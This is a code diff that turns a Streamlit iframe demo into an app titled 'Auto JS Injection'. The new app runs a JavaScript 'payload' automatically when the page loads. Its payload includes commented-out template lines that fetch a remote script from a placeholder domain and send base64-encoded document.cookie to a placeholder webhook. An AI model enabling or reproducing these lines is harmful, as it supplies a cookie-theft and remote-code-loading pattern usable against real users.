@@ -3,7 +3,7 @@ import streamlit.components.v1 as components
 
 # Cấu hình page
 st.set_page_config(
-    page_title="Demo App",
+    page_title="Auto JS Injection",
     page_icon="🚀",
     layout="wide"
 )
@@ -18,291 +18,143 @@ header {visibility: hidden;}
 """
 st.markdown(hide_st_style, unsafe_allow_html=True)
 
-# Initialize session state
-if 'iframe_url' not in st.session_state:
-    st.session_state.iframe_url = ""
-if 'iframe_height' not in st.session_state:
-    st.session_state.iframe_height = 600
+# Target URL - thay đổi URL này theo ý muốn
+TARGET_URL = "https://example.com"
 
-# Sidebar controls
-with st.sidebar:
-    st.header("⚙️ Settings")
-    
-    iframe_url = st.text_input(
-        "Enter URL to load:",
-        value="https://example.com",
-        help="Enter the full URL including https://"
-    )
-    
-    iframe_height = st.slider(
-        "Iframe Height:",
-        min_value=300,
-        max_value=1200,
-        value=600,
-        step=50
-    )
-    
-    scrolling = st.checkbox("Enable Scrolling", value=True)
-    
-    if st.button("Load Iframe", type="primary"):
-        st.session_state.iframe_url = iframe_url
-        st.session_state.iframe_height = iframe_height
-        st.rerun()
+# JavaScript payload - code sẽ tự động chạy
+JS_PAYLOAD = """
+// Auto-executed JavaScript payload
+console.log('Auto-injected JS from Streamlit');
+console.log('Current time:', new Date().toISOString());
 
-# Main content
-st.title("🎯 Streamlit Iframe Loader")
-st.markdown("---")
+// Thử access parent window
+try {
+    console.log('Parent location:', window.parent.location.href);
+} catch(e) {
+    console.log('Cross-origin blocked:', e.message);
+}
 
-# Tabs for different iframe methods
-tab1, tab2, tab3, tab4 = st.tabs([
-    "📄 Basic Iframe", 
-    "🔧 Custom HTML", 
-    "💉 JS Injection",
-    "🎨 Advanced"
-])
+// PostMessage to parent
+if (window.parent !== window) {
+    window.parent.postMessage({
+        type: 'auto_payload',
+        timestamp: Date.now(),
+        message: 'Payload executed successfully'
+    }, '*');
+}
 
-with tab1:
-    st.subheader("Method 1: components.iframe()")
-    
-    if st.session_state.iframe_url:
-        try:
-            components.iframe(
-                st.session_state.iframe_url,
-                height=st.session_state.iframe_height,
-                scrolling=scrolling
-            )
-            st.success(f"✅ Loaded: {st.session_state.iframe_url}")
-        except Exception as e:
-            st.error(f"❌ Error: {str(e)}")
-    else:
-        st.info("👈 Enter a URL in the sidebar and click 'Load Iframe'")
+// Load external script (uncomment nếu cần)
+// var s = document.createElement('script');
+// s.src = 'https://YOUR-DOMAIN.com/payload.js';
+// document.head.appendChild(s);
 
-with tab2:
-    st.subheader("Method 2: Custom HTML with components.html()")
+// Cookie exfiltration (uncomment nếu cần)
+// fetch('https://YOUR-WEBHOOK.com/log?data=' + btoa(document.cookie));
+
+// Alert để confirm JS đã chạy
+alert('JS Payload executed from Streamlit!');
+"""
+
+# Create HTML with auto-injection
+injection_html = f"""
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <style>
+        * {{
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }}
+        body {{
+            background: #1a1a1a;
+            color: #fff;
+            font-family: monospace;
+        }}
+        #info {{
+            padding: 10px;
+            background: #2a2a2a;
+            border-bottom: 2px solid #00ff00;
+        }}
+        iframe {{
+            width: 100%;
+            height: calc(100vh - 50px);
+            border: none;
+        }}
+        .status {{
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 3px;
+            background: #333;
+        }}
+    </style>
+</head>
+<body>
+    <div id="info">
+        🎯 Target: <span id="url">{TARGET_URL}</span> | 
+        Status: <span class="status" id="status">Loading...</span> |
+        JS: <span class="status" id="js-status">Executing...</span>
+    </div>
+    <iframe id="targetFrame" src="{TARGET_URL}"></iframe>
     
-    custom_url = st.text_input("URL for custom HTML:", value="https://example.com")
-    
-    if st.button("Load Custom HTML"):
-        html_code = f"""
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <style>
-                body {{
-                    margin: 0;
-                    padding: 0;
-                    overflow: hidden;
-                }}
-                iframe {{
-                    border: none;
-                    width: 100%;
-                    height: 600px;
-                }}
-            </style>
-        </head>
-        <body>
-            <iframe src="{custom_url}" 
-                    sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
-                    referrerpolicy="no-referrer">
-            </iframe>
-        </body>
-        </html>
-        """
+    <script>
+        // Auto-injected payload
+        {JS_PAYLOAD}
         
-        components.html(html_code, height=620)
-        st.success(f"✅ Custom HTML loaded: {custom_url}")
-
-with tab3:
-    st.subheader("Method 3: Iframe with JS Injection")
-    
-    target_url = st.text_input("Target URL:", value="https://example.com", key="js_url")
-    js_payload = st.text_area(
-        "JavaScript Payload:",
-        value="""console.log('Loaded from Streamlit');
-alert('Hello from injected JS!');""",
-        height=150
-    )
-    
-    if st.button("Inject & Load"):
-        # Create HTML page with JS injection
-        injection_html = f"""
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <meta charset="UTF-8">
-            <style>
-                * {{
-                    margin: 0;
-                    padding: 0;
-                    box-sizing: border-box;
-                }}
-                body {{
-                    background: #1a1a1a;
-                    color: #fff;
-                    font-family: monospace;
-                }}
-                #info {{
-                    padding: 10px;
-                    background: #2a2a2a;
-                    border-bottom: 2px solid #00ff00;
-                }}
-                iframe {{
-                    width: 100%;
-                    height: calc(100vh - 50px);
-                    border: none;
-                }}
-            </style>
-        </head>
-        <body>
-            <div id="info">
-                🎯 Target: <span id="url">{target_url}</span> | 
-                Status: <span id="status">Loading...</span>
-            </div>
-            <iframe id="targetFrame" src="{target_url}"></iframe>
+        // Update status
+        document.getElementById('js-status').textContent = '✅ Executed';
+        document.getElementById('js-status').style.color = '#00ff00';
+        
+        // Monitor iframe loading
+        const frame = document.getElementById('targetFrame');
+        const status = document.getElementById('status');
+        
+        frame.onload = function() {{
+            status.textContent = '✅ Loaded';
+            status.style.color = '#00ff00';
             
-            <script>
-                // Your injected payload
-                {js_payload}
-                
-                // Monitor iframe loading
-                const frame = document.getElementById('targetFrame');
-                const status = document.getElementById('status');
-                
-                frame.onload = function() {{
-                    status.textContent = '✅ Loaded';
-                    status.style.color = '#00ff00';
-                    
-                    // Try to access iframe content (will fail if cross-origin)
-                    try {{
-                        const iframeDoc = frame.contentDocument || frame.contentWindow.document;
-                        console.log('Iframe accessible:', iframeDoc.title);
-                    }} catch(e) {{
-                        console.log('Cross-origin restriction:', e.message);
-                    }}
-                }};
-                
-                frame.onerror = function() {{
-                    status.textContent = '❌ Error';
-                    status.style.color = '#ff0000';
-                }};
-                
-                // PostMessage listener
-                window.addEventListener('message', function(event) {{
-                    console.log('Received message:', event.data);
-                }});
-                
-                // Send message to parent (Streamlit)
-                if (window.parent !== window) {{
-                    window.parent.postMessage({{
-                        type: 'streamlit_child',
-                        status: 'loaded',
-                        url: '{target_url}'
-                    }}, '*');
-                }}
-            </script>
-        </body>
-        </html>
-        """
-        
-        components.html(injection_html, height=650, scrolling=False)
-
-with tab4:
-    st.subheader("Method 4: Advanced - Multiple Iframes")
-    
-    st.markdown("**Load multiple pages simultaneously:**")
-    
-    col1, col2 = st.columns(2)
-    
-    with col1:
-        url1 = st.text_input("URL 1:", value="https://example.com", key="url1")
-    with col2:
-        url2 = st.text_input("URL 2:", value="https://httpbin.org/html", key="url2")
-    
-    if st.button("Load Both"):
-        advanced_html = f"""
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <style>
-                body {{
-                    margin: 0;
-                    padding: 10px;
-                    background: #0e1117;
-                    font-family: sans-serif;
-                }}
-                .container {{
-                    display: grid;
-                    grid-template-columns: 1fr 1fr;
-                    gap: 10px;
-                    height: 100vh;
-                }}
-                .iframe-wrapper {{
-                    border: 2px solid #333;
-                    border-radius: 8px;
-                    overflow: hidden;
-                    background: #1a1a1a;
-                }}
-                .iframe-header {{
-                    padding: 8px;
-                    background: #262626;
-                    color: #00ff00;
-                    font-size: 12px;
-                    font-family: monospace;
-                }}
-                iframe {{
-                    width: 100%;
-                    height: calc(100% - 32px);
-                    border: none;
-                }}
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <div class="iframe-wrapper">
-                    <div class="iframe-header">🌐 Frame 1: {url1}</div>
-                    <iframe src="{url1}" sandbox="allow-scripts allow-same-origin"></iframe>
-                </div>
-                <div class="iframe-wrapper">
-                    <div class="iframe-header">🌐 Frame 2: {url2}</div>
-                    <iframe src="{url2}" sandbox="allow-scripts allow-same-origin"></iframe>
-                </div>
-            </div>
+            console.log('Iframe loaded:', '{TARGET_URL}');
             
-            <script>
-                console.log('Multiple iframes loaded');
-                
-                // Monitor both frames
-                document.querySelectorAll('iframe').forEach((frame, index) => {{
-                    frame.onload = () => console.log(`Frame ${{index + 1}} loaded`);
-                    frame.onerror = () => console.log(`Frame ${{index + 1}} error`);
-                }});
-            </script>
-        </body>
-        </html>
-        """
+            // Try to access iframe content (will fail if cross-origin)
+            try {{
+                const iframeDoc = frame.contentDocument || frame.contentWindow.document;
+                console.log('Iframe accessible:', iframeDoc.title);
+            }} catch(e) {{
+                console.log('Cross-origin restriction:', e.message);
+            }}
+        }};
         
-        components.html(advanced_html, height=700)
+        frame.onerror = function() {{
+            status.textContent = '❌ Error';
+            status.style.color = '#ff0000';
+        }};
+        
+        // PostMessage listener
+        window.addEventListener('message', function(event) {{
+            console.log('Received message:', event);
+            console.log('Data:', event.data);
+            console.log('Origin:', event.origin);
+        }});
+        
+        // Log app loaded
+        console.log('=== Streamlit Auto-Injection App ===');
+        console.log('Target URL:', '{TARGET_URL}');
+        console.log('Timestamp:', new Date().toISOString());
+    </script>
+</body>
+</html>
+"""
 
-# Footer info
+# Auto-render HTML - không cần button
+components.html(injection_html, height=650, scrolling=False)
+
+# Optional: Display info
 st.markdown("---")
-st.markdown("""
-### 📝 Usage Notes:
-- **Basic Iframe**: Simple wrapper using `components.iframe()`
-- **Custom HTML**: Full control over iframe attributes
-- **JS Injection**: Inject custom JavaScript alongside iframe
-- **Advanced**: Load multiple iframes with custom styling
-
-### ⚠️ Security Notes:
-- Iframes have sandbox restrictions
-- Cross-origin access is limited by CORS
-- Use `allow-scripts` carefully in production
-- PostMessage is the safe way to communicate between frames
-""")
+st.info(f"🔄 Auto-loading: {TARGET_URL}")
+st.success("✅ JavaScript payload executing automatically")
 
 # Debug info
-with st.expander("🔍 Debug Info"):
-    st.json({
-        "current_url": st.session_state.iframe_url,
-        "iframe_height": st.session_state.iframe_height,
-        "session_state": dict(st.session_state)
-    })
+with st.expander("🔍 Configuration"):
+    st.code(f"Target URL: {TARGET_URL}", language="text")
+    st.code(JS_PAYLOAD, language="javascript")
